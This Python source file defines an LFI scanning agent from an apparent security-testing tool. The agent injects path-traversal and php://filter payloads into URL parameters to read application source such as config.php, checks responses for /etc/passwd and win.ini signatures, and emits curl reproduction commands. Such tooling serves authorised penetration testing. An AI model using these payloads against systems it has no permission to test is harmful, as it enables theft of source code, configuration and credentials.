import logging
import aiohttp
from typing import Dict, List, Optional
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bugtrace.agents.base import BaseAgent
from bugtrace.core.ui import dashboard
from bugtrace.tools.external import external_tools

logger = logging.getLogger(__name__)

class LFIAgent(BaseAgent):
    """
    Specialist Agent for Local File Inclusion (LFI) and Path Traversal.
    """
    
    def __init__(self, url: str, params: List[str] = None, report_dir: Path = None):
        super().__init__(
            name="LFIAgent",
            role="LFI Specialist",
            agent_id="lfi_agent"
        )
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        
        # Deduplication
        self._tested_params = set()
        
    def _determine_validation_status(self, response_text: str, payload: str) -> str:
        """
        Determine validation status based on what we actually found.

        TIER 1 (VALIDATED_CONFIRMED):
            - /etc/passwd content visible (root:x:0:0)
            - win.ini content visible ([extensions])
            - PHP source code visible (<?php or base64 decoded PHP)

        TIER 2 (PENDING_VALIDATION):
            - Path traversal success but no sensitive file content
            - PHP wrapper returned something but unclear if source code
        """
        # TIER 1: Clear sensitive file signatures
        tier1_signatures = [
            "root:x:0:0",           # /etc/passwd Linux
            "root:*:0:0",           # /etc/passwd BSD
            "[extensions]",         # win.ini
            "[fonts]",              # win.ini
            "127.0.0.1 localhost",  # /etc/hosts
            "<?php",                # PHP source code (direct)
        ]

        for sig in tier1_signatures:
            if sig in response_text:
                logger.info(f"[{self.name}] Found '{sig}' in response. VALIDATED_CONFIRMED")
                return "VALIDATED_CONFIRMED"

        # TIER 1: Base64 decoded PHP (from php://filter)
        if "PD9waH" in response_text:  # Base64 for <?php
            logger.info(f"[{self.name}] Found base64 PHP source. VALIDATED_CONFIRMED")
            return "VALIDATED_CONFIRMED"

        # TIER 2: Path traversal worked but didn't get sensitive content
        # This could be a directory listing or error page
        logger.info(f"[{self.name}] LFI response unclear. PENDING_VALIDATION")
        return "PENDING_VALIDATION"

    async def _get_response_text(self, session, payload, param) -> str:
        """Get the response text for classification."""
        target_url = self._inject_payload(self.url, param, payload)
        try:
            async with session.get(target_url, timeout=5) as resp:
                return await resp.text()
        except Exception as e:
            logger.debug(f"_get_response_text failed: {e}")
            return ""
        
    def _create_lfi_finding_from_hit(self, hit: Dict, param: str) -> Dict:
        """Create LFI finding from fuzzer hit."""
        return {
            "type": "LFI / Path Traversal",
            "url": self.url,
            "parameter": param,
            "payload": hit["payload"],
            "description": f"Local File Inclusion success: Found {hit['file_found']}. File content leaked in response.",
            "severity": hit["severity"],
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "evidence": hit["evidence"],
            "reproduction": f"curl '{self.url}?{param}={hit['payload']}'"
        }

    def _create_lfi_finding_from_wrapper(self, payload: str, param: str, response_text: str) -> Dict:
        """Create LFI finding from PHP wrapper test."""
        return {
            "type": "LFI / Path Traversal",
            "url": self.url,
            "parameter": param,
            "payload": payload,
            "description": f"LFI detected via PHP wrapper. Source code can be read using base64 encoding filter.",
            "severity": "CRITICAL",
            "validated": True,
            "evidence": f"PHP Wrapper matched signature after injecting {payload}",
            "status": self._determine_validation_status(response_text, payload),
            "reproduction": f"curl '{self.url}?{param}={payload}' | base64 -d"
        }

    async def _test_php_wrappers(self, session, param: str) -> Optional[Dict]:
        """Test PHP wrapper payloads as fallback."""
        base_payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php"
        ]

        for p in base_payloads:
            dashboard.update_task(f"LFI:{param}", status=f"Testing Wrapper {p[:20]}...")
            if await self._test_payload(session, p, param):
                response_text = await self._get_response_text(session, p, param)
                return self._create_lfi_finding_from_wrapper(p, param, response_text)
        return None

    async def run_loop(self) -> Dict:
        """Main execution loop for LFI testing."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 Starting LFI analysis on {self.url}", "INFO")

        all_findings = []
        async with aiohttp.ClientSession() as session:
            for param in self.params:
                logger.info(f"[{self.name}] Testing LFI on {self.url} (param: {param})")

                key = f"{self.url}#{param}"
                if key in self._tested_params:
                    logger.info(f"[{self.name}] Skipping {param} - already tested")
                    continue

                # High-Performance Go Fuzzer
                dashboard.log(f"[{self.name}] 🚀 Launching Go LFI Fuzzer on '{param}'...", "INFO")
                go_result = await external_tools.run_go_lfi_fuzzer(self.url, param)

                if go_result and go_result.get("hits"):
                    for hit in go_result["hits"]:
                        dashboard.log(f"[{self.name}] 🚨 LFI HIT: {hit['payload']} ({hit['severity']})", "CRITICAL")
                        all_findings.append(self._create_lfi_finding_from_hit(hit, param))
                        self._tested_params.add(key)
                        break

                # Base Payloads (Manual Fallback if Go fails or for PHP wrappers)
                if key not in self._tested_params:
                    wrapper_finding = await self._test_php_wrappers(session, param)
                    if wrapper_finding:
                        all_findings.append(wrapper_finding)
                        self._tested_params.add(key)

        return {"vulnerable": len(all_findings) > 0, "findings": all_findings}

    async def _test_payload(self, session, payload, param) -> bool:
        """Injects payload and analyzes response."""
        target_url = self._inject_payload(self.url, param, payload)
        
        try:
            async with session.get(target_url, timeout=5) as resp:
                text = await resp.text()
                
                # Heuristics for detection
                signatures = [
                    "root:x:0:0",                  # /etc/passwd
                    "[extensions]",                # win.ini
                    "[fonts]",                     # win.ini
                    "PD9waH",                      # Base64 for <?php
                    "root:*:0:0",                  # /etc/passwd (other formats)
                    "127.0.0.1 localhost"         # /etc/hosts
                ]

                if any(sig in text for sig in signatures):
                    return True

        except Exception as e:
            logger.debug(f"Path traversal signature check failed: {e}")

        return False

    def _inject_payload(self, url, param, payload):
        parsed = urlparse(url)
        q = parse_qs(parsed.query)
        q[param] = [payload]
        new_query = urlencode(q, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
